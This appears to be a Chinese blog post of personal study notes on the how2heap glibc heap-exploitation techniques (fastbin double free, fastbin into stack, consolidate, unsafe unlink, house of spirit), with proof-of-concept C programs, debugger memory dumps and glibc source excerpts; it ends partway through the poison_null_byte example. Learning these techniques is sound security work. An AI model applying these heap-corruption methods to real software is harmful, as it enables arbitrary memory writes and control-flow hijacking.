---
title: how2heap学习记录
published: 2026-02-01
description: "持续补充ing"
image: ''
tags: [PWN，note]
category: PWN
draft: false
---

编译指令：

```bash
gcc fastbin_dup.c -o a.out \
    -Wl,--rpath=/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 \
    -Wl,--dynamic-linker=/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so
```

### fastbin_dup

利用 fastbins 的 double-free 攻击，可以泄漏出一块**已经被分配的内存指针**

fastbins 可以看成一个 LIFO 的栈，使用单链表实现，通过 fastbin->fd 来遍历 fastbins

```c
    char *a = malloc(9);
    char *b = malloc(9);
    char *c = malloc(9);

    fprintf(stderr, "Freeing the first one %p.\n", a);
    free(a);
    fprintf(stderr, "Then freeing another one %p.\n", b);
    free(b);
    fprintf(stderr, "Freeing the first one %p again.\n", a);
    free(a);

    char *d = malloc(9);
    char *e = malloc(9);
    char *f = malloc(9);
```

libc-2.23 中对 double-free 的检查过程如下：

```c
    /* Check that the top of the bin is not the record we are going to add
       (i.e., double free).  */
    if (__builtin_expect (old == p, 0))
      {
        errstr = "double free or corruption (fasttop)";
        goto errout;
      }
```

它在检查 fast bin 的 double-free 时只是检查了第一个块。所以其实是存在缺陷的。

我们double free之后，fastbins中会出现

```c
Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  →  [loop detected]
```

此时 chunk a 和 chunk b 似乎形成了一个环，

此后的malloc会从这个环中不断地取用，而chunk a，chunk b始终是free状态

```bash
pwndbg> heap
Free chunk (fastbins) | PREV_INUSE
Addr: 0x602000
Size: 0x20 (with flag bits: 0x21)
fd: 0x602020

Free chunk (fastbins) | PREV_INUSE
Addr: 0x602020
Size: 0x20 (with flag bits: 0x21)
fd: 0x602000

Allocated chunk | PREV_INUSE
Addr: 0x602040
Size: 0x20 (with flag bits: 0x21)

Top chunk | PREV_INUSE
Addr: 0x602060
Size: 0x20fa0 (with flag bits: 0x20fa1)
```

所以对于 fastbins，可以通过 double-free 泄漏出一个堆块的指针。



### fastbin_dup_into_stack

`double free`的利用：

- malloc的检查：检查块的大小

  ```c
  /* offset 2 to use otherwise unindexable first 2 bins */
  #define fastbin_index(sz) \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
  
    if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
      {
        idx = fastbin_index (nb);
        [...]
  
        if (victim != 0)
          {
            if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
              {
                errstr = "malloc(): memory corruption (fast)";
                [...]
              }
              [...]
          }
      }
  ```

  glibc 在执行分配操作时，若块的大小符合 fast bin，则会在对应的 bin 中寻找合适的块，此时 glibc 将根据候选块的 size 字段计算出 fastbin 索引，然后与对应 bin 在 fastbin 中的索引进行比较，如果二者不匹配，则说明块的 size 字段遭到破坏。所以需要 fake chunk 的 size 字段被设置为正确的值。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    unsigned long long stack_var = 0x21;
    fprintf(stderr, "Allocating 3 buffers.\n");
    char *a = malloc(9);
    char *b = malloc(9);
    char *c = malloc(9);
    strcpy(a, "AAAAAAAA");
    strcpy(b, "BBBBBBBB");
    strcpy(c, "CCCCCCCC");
    fprintf(stderr, "1st malloc(9) %p points to %s\n", a, a);
    fprintf(stderr, "2nd malloc(9) %p points to %s\n", b, b);
    fprintf(stderr, "3rd malloc(9) %p points to %s\n", c, c);

    fprintf(stderr, "Freeing the first one %p.\n", a);
    free(a);
    fprintf(stderr, "Then freeing another one %p.\n", b);
    free(b);
    fprintf(stderr, "Freeing the first one %p again.\n", a);
    free(a);

    fprintf(stderr, "Allocating 4 buffers.\n");
    unsigned long long *d = malloc(9);
    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
    fprintf(stderr, "4nd malloc(9) %p points to %p\n", d, &d);
    char *e = malloc(9);
    strcpy(e, "EEEEEEEE");
    fprintf(stderr, "5nd malloc(9) %p points to %s\n", e, e);
    char *f = malloc(9);
    strcpy(f, "FFFFFFFF");
    fprintf(stderr, "6rd malloc(9) %p points to %s\n", f, f);
    char *g = malloc(9);
    strcpy(g, "GGGGGGGG");
    fprintf(stderr, "7th malloc(9) %p points to %s\n", g, g);
}
```

```c
$ gcc -g fastbin_dup_into_stack.c
$ ./a.out
Allocating 3 buffers.
1st malloc(9) 0xcf2010 points to AAAAAAAA
2nd malloc(9) 0xcf2030 points to BBBBBBBB
3rd malloc(9) 0xcf2050 points to CCCCCCCC
Freeing the first one 0xcf2010.
Then freeing another one 0xcf2030.
Freeing the first one 0xcf2010 again.
Allocating 4 buffers.
4nd malloc(9) 0xcf2010 points to 0x7ffd1e0d48b0
5nd malloc(9) 0xcf2030 points to EEEEEEEE
6rd malloc(9) 0xcf2010 points to FFFFFFFF
7th malloc(9) 0x7ffd1e0d48b0 points to GGGGGGGG
```

对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。

在案例中便获得了`*g  -->	0x7ffd1e0d48b0 `

### fastbin_dup_consolidate

**在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查**

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main() {
    void *p1 = malloc(0x10);
    void *p2 = malloc(0x10);
    strcpy(p1, "AAAAAAAA");
    strcpy(p2, "BBBBBBBB");
    fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);

    fprintf(stderr, "Now free p1!\n");
    free(p1);

    void *p3 = malloc(0x400);
    fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
    fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");

    free(p1);
    fprintf(stderr, "Trigger the double free vulnerability!\n");
    fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");

    void *p4 = malloc(0x10);
    strcpy(p4, "CCCCCCC");
    void *p5 = malloc(0x10);
    strcpy(p5, "DDDDDDDD");
    fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", p4, p5);
}
```

```bash
$ gcc -g fastbin_dup_consolidate.c
$ ./a.out
Allocated two fastbins: p1=0x17c4010 p2=0x17c4030
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x17c4050
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x17c4010 0x17c4010
```

1. 首先分配两个 fast chunk：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1
   0x602010:   0x4141414141414141  0x0000000000000000
   0x602020:   0x0000000000000000  0x0000000000000021  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000020fc1  <-- top chunk
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   ```

2. 释放掉 p1，则空闲 chunk 加入到 fastbins 中：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [be freed]
   0x602010:   0x0000000000000000  0x0000000000000000
   0x602020:   0x0000000000000000  0x0000000000000021  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000020fc1  <-- top chunk
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   ```

   此时如果我们再次释放 p1，必然触发 double free 异常，然而，如果此时分配一个 large chunk，效果如下：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [be freed]
   0x602010:   0x00007ffff7dd1b88  0x00007ffff7dd1b88      <-- fd, bk pointer
   0x602020:   0x0000000000000020  0x0000000000000020  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10] 0x00
   gef➤  heap bins small
   [ Small Bins for arena 'main_arena' ]
   [+] small_bins[1]: fw=0x602000, bk=0x602000
    →   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   [+] Found 1 chunks in 1 small non-empty bins.
   ```

   可以看到 fastbins 中的 chunk 已经不见了，反而出现在了 small bins 中，并且 chunk p2 的 prev_size 和 size 字段都被修改。

3. 由于此时 p1 已经不在 fastbins 的顶部，可以再次释放 p1：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [double freed]
   0x602010:   0x0000000000000000  0x00007ffff7dd1b88
   0x602020:   0x0000000000000020  0x0000000000000020  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   gef➤  heap bins small
   [ Small Bins for arena 'main_arena' ]
   [+] small_bins[1]: fw=0x602000, bk=0x602000
    →   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   [+] Found 1 chunks in 1 small non-empty bins.
   ```

4. p1 被再次放入 fastbins，于是 p1 同时存在于 fabins 和 small bins 中。

   第一次 malloc，chunk 将从 fastbins 中取出：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p1 [be freed], chunk p4
   0x602010:   0x0043434343434343  0x00007ffff7dd1b88
   0x602020:   0x0000000000000020  0x0000000000000020  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10] 0x00
   gef➤  heap bins small
   [ Small Bins for arena 'main_arena' ]
   [+] small_bins[1]: fw=0x602000, bk=0x602000
    →   Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)
   [+] Found 1 chunks in 1 small non-empty bins.
   ```

5. 第二次 malloc，chunk 从 small bins 中取出：

   ```c
   gef➤  x/15gx 0x602010-0x10
   0x602000:   0x0000000000000000  0x0000000000000021  <-- chunk p4, chunk p5
   0x602010:   0x4444444444444444  0x00007ffff7dd1b00
   0x602020:   0x0000000000000020  0x0000000000000021  <-- chunk p2
   0x602030:   0x4242424242424242  0x0000000000000000
   0x602040:   0x0000000000000000  0x0000000000000411  <-- chunk p3
   0x602050:   0x0000000000000000  0x0000000000000000
   0x602060:   0x0000000000000000  0x0000000000000000
   0x602070:   0x0000000000000000
   ```

6. 最后得到的是chunk p4 和 p5 在同一位置，**造成堆块的重叠**

7. 原理：

   large chunk 的分配过程：

   ```c
     /*
        If this is a large request, consolidate fastbins before continuing.
        While it might look excessive to kill all fastbins before
        even seeing if there is space available, this avoids
        fragmentation problems normally associated with fastbins.
        Also, in practice, programs tend to have runs of either small or
        large requests, but less often mixtures, so consolidation is not
        invoked all that often in most programs. And the programs that
        it is called frequently in otherwise tend to fragment.
      */
   
     else
       {
         idx = largebin_index (nb);
         if (have_fastchunks (av))
           malloc_consolidate (av);
       }
   ```

   当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 **malloc_consolidate() 函数合并** fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。

### unsafe_unlink

利用 free 改写全局指针 chunk0_ptr 达到任意内存写的目的

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t *chunk0_ptr;

int main() {
    int malloc_size = 0x80; // not fastbins
    							// fastbins中的堆块大小范围在0x20-0x80之间，而malloc（0x80）会申请大小为0x90的chunk，所以不会存入fastbins中
    int header_size = 2;

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    // pass this check: (P->fd->bk != P || P->bk->fd != P) == False
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, "Fake chunk fd: %p\n", (void*) chunk0_ptr[2]);
    fprintf(stderr, "Fake chunk bk: %p\n\n", (void*) chunk0_ptr[3]);
    // pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
    // chunk0_ptr[1] = 0x0; // or 0x8, 0x80

    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    chunk1_hdr[0] = malloc_size;
    chunk1_hdr[1] &= ~1;

    // deal with tcache
    // int *a[10];
    // int i;
    // for (i = 0; i < 7; i++) {
    //   a[i] = malloc(0x80);
    // }
    // for (i = 0; i < 7; i++) {
    //   free(a[i]);
    // }
    free(chunk1_ptr);

    char victim_string[9];
    strcpy(victim_string, "AAAAAAAA");
    chunk0_ptr[3] = (uint64_t) victim_string;
    fprintf(stderr, "Original value: %s\n", victim_string);

    chunk0_ptr[0] = 0x4242424242424242LL;
    fprintf(stderr, "New Value: %s\n", victim_string);
}
```

```c
$ gcc -g unsafe_unlink.c
$ ./a.out
The global chunk0_ptr is at 0x601070, pointing to 0x721010
The victim chunk we are going to corrupt is at 0x7210a0

Fake chunk fd: 0x601058
Fake chunk bk: 0x601060

Original value: AAAAAAAA
New Value: BBBBBBBB
```

unlink代码与检查如下：

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;                                      \
    BK = P->bk;                                      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))              \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {                                      \
        FD->bk = BK;                                  \
        BK->fd = FD;                                  \
        if (!in_smallbin_range (P->size)                      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {              \
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)          \
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
          malloc_printerr (check_action,                      \
                   "corrupted double-linked list (not small)",    \
                   P, AV);                          \
            if (FD->fd_nextsize == NULL) {                      \
                if (P->fd_nextsize == P)                      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;              \
                else {                                  \
                    FD->fd_nextsize = P->fd_nextsize;                  \
                    FD->bk_nextsize = P->bk_nextsize;                  \
                    P->fd_nextsize->bk_nextsize = FD;                  \
                    P->bk_nextsize->fd_nextsize = FD;                  \
                  }                                  \
              } else {                                  \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;              \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;              \
              }                                      \
          }                                      \
      }                                          \
}
```



构造fake chunk

```c
pwndbg> x/80gx 0x603000
0x603000:       0x0000000000000000      0x0000000000000091  --> chunk0
0x603010:       0x0000000000000000      0x0000000000000000	--> fake chunk,P
0x603020:       0x0000000000602060      0x0000000000602068	--> fd,bk
0x603030:       0x0000000000000000      0x0000000000000000
0x603040:       0x0000000000000000      0x0000000000000000
0x603050:       0x0000000000000000      0x0000000000000000
0x603060:       0x0000000000000000      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000091  -->chunk1
0x6030a0:       0x0000000000000000      0x0000000000000000
0x6030b0:       0x0000000000000000      0x0000000000000000
0x6030c0:       0x0000000000000000      0x0000000000000000
0x6030d0:       0x0000000000000000      0x0000000000000000
0x6030e0:       0x0000000000000000      0x0000000000000000
0x6030f0:       0x0000000000000000      0x0000000000000000
0x603100:       0x0000000000000000      0x0000000000000000
0x603110:       0x0000000000000000      0x0000000000000000
```

```c
pwndbg> x/20gx 0x0000000000602060	
0x602060:       0x0000000000000000      0x00007ffff7bc5620	--> FD
0x602070:       0x0000000000000000      0x0000000000603010	--> bk
0x602080:       0x0000000000000000      0x0000000000000000
0x602090:       0x0000000000000000      0x0000000000000000
0x6020a0:       0x0000000000000000      0x0000000000000000
0x6020b0:       0x0000000000000000      0x0000000000000000
0x6020c0:       0x0000000000000000      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
```

```c
pwndbg> x/20gx 0x0000000000602068
0x602068:       0x00007ffff7bc5620      0x0000000000000000	--> BK
0x602078:       0x0000000000603010--> fd 0x0000000000000000	
0x602088:       0x0000000000000000      0x0000000000000000
0x602098:       0x0000000000000000      0x0000000000000000
0x6020a8:       0x0000000000000000      0x0000000000000000
0x6020b8:       0x0000000000000000      0x0000000000000000
0x6020c8:       0x0000000000000000      0x0000000000000000
0x6020d8:       0x0000000000000000      0x0000000000000000
0x6020e8:       0x0000000000000000      0x0000000000000000
0x6020f8:       0x0000000000000000      0x0000000000000000
```

可以看到，我们在 chunk0 里构造一个 fake chunk，用 P 表示，两个指针 fd 和 bk 可以构成两条链：`P->fd->bk == P`，`P->bk->fd == P`，可以绕过检查

```c
(P->fd->bk != P || P->bk->fd != P) == False
    P->fd = FD = 0x602060 
    FD->bk = *0x602078 = 0x603010 = P
    
    P->bk = BK = 0x602068
    BK->fd = *0x602078 = 0x603010 =P
```

另外利用 chunk0 的溢出漏洞，通过修改 chunk 1 的 `prev_size` 为 fake chunk 的大小，修改 `PREV_INUSE` 标志位为 0，将 fake chunk 伪造成一个 free chunk。

接下来就是释放掉 chunk1，这会触发 fake chunk 的 unlink 并覆盖 `chunk0_ptr` 的值。unlink 操作是这样进行的：

```c
FD = P->fd;
BK = P->bk;

FD->bk = BK
    *0x602078 = 0x602068
BK->fd = FD
    *0x602078 = 0x602060
    
最后造成的结果便是*0x602078 = 0x602060
```

原本指向堆上 fake chunk 的指针 P 指向了自身地址减 24 的位置，这就意味着如果程序功能允许堆 P 进行写入，就能改写 P 指针自身的地址，从而造成任意内存写入。若允许堆 P 进行读取，则会造成信息泄漏。

在这个例子中，由于 P->fd->bk 和 P->bk->fd 都指向 P，所以最后的结果为：

```c
chunk0_ptr = P = P->fd
    
    
    
pwndbg> x/20gx 0x0000000000602060
0x602060:       0x0000000000000000      0x00007ffff7bc5620
0x602070:       0x0000000000000000      0x0000000000602060
0x602080:       0x0000000000000000      0x0000000000000000
0x602090:       0x0000000000000000      0x0000000000000000
0x6020a0:       0x0000000000000000      0x0000000000000000
0x6020b0:       0x0000000000000000      0x0000000000000000
0x6020c0:       0x0000000000000000      0x0000000000000000
0x6020d0:       0x0000000000000000      0x0000000000000000
0x6020e0:       0x0000000000000000      0x0000000000000000
0x6020f0:       0x0000000000000000      0x0000000000000000
pwndbg> p chunk0_ptr
$6 = (uint64_t *) 0x602060
pwndbg> p &chunk0_ptr
$7 = (uint64_t **) 0x602078 <chunk0_ptr>
    
//此时，chunk0_ptr[3]=0x602060
```

此时，我们可以通过写入chunk_ptr[3]来修改chunk_0ptr来进行任意地址写



#### prev_size检查

libc-2.25 在 unlink 的开头增加了对 `chunk_size == next->prev->chunk_size` 的检查，以对抗单字节溢出的问题。补丁如下：

```c
/* Ptr to next physical malloc_chunk. */
#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))
/* Get size, ignoring use bits */
#define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))
/* Like chunksize, but do not mask SIZE_BITS.  */
#define chunksize_nomask(p)         ((p)->mchunk_size)
/* Size of the chunk below P.  Only valid if prev_inuse (P).  */
#define prev_size(p) ((p)->mchunk_prev_size)
/* Bits to mask off when extracting size  */
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
```

1. 获取 P 的 `size` 字段（去掉标志位）

2. 通过指针运算找到下一个块的地址：`P的地址 + P的大小(0x100)`

3. 读取 Next Chunk 的 `prev_size` 字段

   因为 P 是空闲的（正在被 unlink），根据 glibc 规则，Next Chunk 的 `PREV_INUSE` 位必定是 0，且 Next Chunk 的 `prev_size` 字段必须存放 P 的大小

4. $$P \to \text{size} == (P + P \to \text{size}) \to \text{prev\_size}$$

回顾一下伪造出来的堆：

```c
gef➤  x/40gx 0x602010-0x10
0x602000:   0x0000000000000000  0x0000000000000091  <-- chunk 0
0x602010:   0x0000000000000000  0x0000000000000000  <-- fake chunk P
0x602020:   0x0000000000601058  0x0000000000601060      <-- fd, bk pointer
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000000
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000000
0x602090:   0x0000000000000080  0x0000000000000090  <-- chunk 1 <-- prev_size
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000000000
0x6020e0:   0x0000000000000000  0x0000000000000000
0x6020f0:   0x0000000000000000  0x0000000000000000
0x602100:   0x0000000000000000  0x0000000000000000
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000020ee1  <-- top chunk
0x602130:   0x0000000000000000  0x0000000000000000
```

这里有三种办法可以绕过该检查：

```c
// 1.  什么都不做
chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x0
prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x0) == 0x0
    
// 2. 设置 chunk0_ptr[1] = 0x8
chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x8
prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x8) == 0x8

// 3. 设置 chunk0_ptr[1] = 0x80
chunksize(P) == chunk0_ptr[1] & (~ 0x7) == 0x80
prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x80) == 0x80
```

#### libc 2.26

新增了tcache机制，这是一种线程缓存机制，每个线程默认情况下有 64 个大小递增的 bins，每个 bin 是一个单链表，默认最多包含 7 个 chunk。其中缓存的 chunk 是不会被合并的，所以在释放 chunk 1 的时候，`chunk0_ptr` 仍然指向正确的堆地址，而不是之前的 `chunk0_ptr = P = P->fd`。为了解决这个问题，一种可能的办法是给填充进特定大小的 chunk 把 bin 占满，就像下面这样：

```c
    // deal with tcache
    int *a[10];
    int i;
    for (i = 0; i < 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i < 7; i++) {
        free(a[i]);
    }
```



### house_of_spirit

house-of-spirit 是一种通过堆的 fast bin 机制来辅助栈溢出的方法

> 一般的栈溢出漏洞的利用都希望能够覆盖函数的返回地址以控制 EIP 来劫持控制流，但如果栈溢出的长度无法覆盖返回地址，同时却可以覆盖栈上的一个即将被 free 的堆指针，此时可以将这个指针改写为栈上的地址并在相应位置构造一个 fast bin 块的元数据，接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    malloc(1);

    fprintf(stderr, "We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\n");
    unsigned long long *a, *b;
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, "The first one:  %p\n", &fake_chunks[0]);
    fprintf(stderr, "The second one: %p\n", &fake_chunks[4]);

    fake_chunks[1] = 0x20;      // the size
    fake_chunks[5] = 0x1234;    // nextsize

    fake_chunks[2] = 0x4141414141414141LL;
    fake_chunks[6] = 0x4141414141414141LL;

    fprintf(stderr, "Overwritting our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[0]);
    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[0], &fake_chunks[2]);
    b = malloc(0x10);
    fprintf(stderr, "malloc(0x10): %p\n", b);
    b[0] = 0x4242424242424242LL;
}
```

```c
$ gcc -g house_of_spirit.c
$ ./a.out
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffc782dae00
The second one: 0x7ffc782dae20
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10!
malloc(0x10): 0x7ffc782dae10
```

1. 首先 malloc(1) 用于初始化内存环境，然后在 fake chunk 区域伪造出两个 chunk。另外正如上面所说的，需要一个传递给 free 函数的可以被修改的指针，无论是通过栈溢出还是其它什么方式：

   ```c
   gef➤  x/10gx &fake_chunks
   0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  <-- fake chunk 1
   0x7fffffffdcc0: 0x4141414141414141  0x0000000000000000
   0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  <-- fake chunk 2
   0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
   gef➤  x/gx &a
   0x7fffffffdca0: 0x0000000000000000
   ```

2. 伪造 chunk 时需要绕过一些检查，首先是标志位，`PREV_INUSE` 位并不影响 free 的过程，但 `IS_MMAPPED` 位和 `NON_MAIN_ARENA` 位都要为零。

   其次，在 64 位系统中 fast chunk 的大小要在 0x20-0x80 字节之间

   最后，是 next chunk 的大小，必须大于 `2*SIZE_SZ`（即大于16），小于 `av->system_mem`（即小于0x21000），才能绕过对 next chunk 大小的检查。

3. 然后修改指针 a 指向 (fake chunk 1 + 0x10) 的位置，然后将其传递给 free 函数，这时程序就会误以为这是一块真的 chunk，然后将其释放并加入到 fastbin 中。

   ```c
   gef➤  x/gx &a
   0x7fffffffdca0: 0x00007fffffffdcc0
   gef➤  x/10gx &fake_chunks
   0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  <-- fake chunk 1 [be freed]
   0x7fffffffdcc0: 0x0000000000000000  0x0000000000000000
   0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  <-- fake chunk 2
   0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
   0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0
   gef➤  heap bins fast
   [ Fastbins for arena 0x7ffff7dd1b20 ]
   Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x7fffffffdcc0, size=0x20, flags=)
   ```

4. 这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。

   ```c
   gef➤  x/10gx &fake_chunks
   0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  <-- new chunk
   0x7fffffffdcc0: 0x4242424242424242  0x0000000000000000
   0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  <-- fake chunk 2
   0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
   0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0
   gef➤  x/gx &b
   0x7fffffffdca8: 0x00007fffffffdcc0
   ```

   

house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。

该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。



### poison_null_byte

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main() {
    uint8_t *a, *b, *c, *b1, *b2, *d;

    a = (uint8_t*) malloc(0x10);
    int real_a_size = malloc_usable_size(a);	//real_a_size = chunksize(a) - 0x8 == 0x18
    fprintf(stderr, "We allocate 0x10 bytes for 'a': %p\n", a);
    fprintf(stderr, "'real' size of 'a': %#x\n", real_a_size);

    b = (uint8_t*) malloc(0x100);
    c = (uint8_t*) malloc(0x80);		//非fastbins，可以合并
    fprintf(stderr, "b: %p\n", b);
    fprintf(stderr, "c: %p\n", c);

    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
    *(size_t*)(b+0xf0) = 0x100;
